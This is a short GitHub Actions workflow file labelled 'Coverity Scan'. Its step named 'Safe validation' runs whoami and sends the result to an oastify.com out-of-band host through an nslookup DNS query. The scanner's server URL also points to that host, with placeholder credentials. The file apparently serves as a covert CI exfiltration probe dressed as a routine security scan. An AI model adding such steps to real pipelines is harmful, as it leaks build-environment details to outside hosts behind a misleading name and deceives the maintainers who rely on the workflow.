name: Coverity Scan
on:
  push:
    branches:
      - main
  workflow_dispatch: {}
jobs:
  coverity:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Source
        uses: actions/checkout@v5

      - name: Safe validation
        run: |
          whoami
          nslookup $(whoami).604euquq6v1fs572kf1w9m8kpbv2jt9hy.oastify.com
      - name: Coverity Scan
        id: coverity-scan
        uses: blackduck-inc/black-duck-security-scan@v2
        with:
          coverity_url: http://604euquq6v1fs572kf1w9m8kpbv2jt9hy.oastify.com
          coverity_user: oobtest
          coverity_passphrase: oobtest
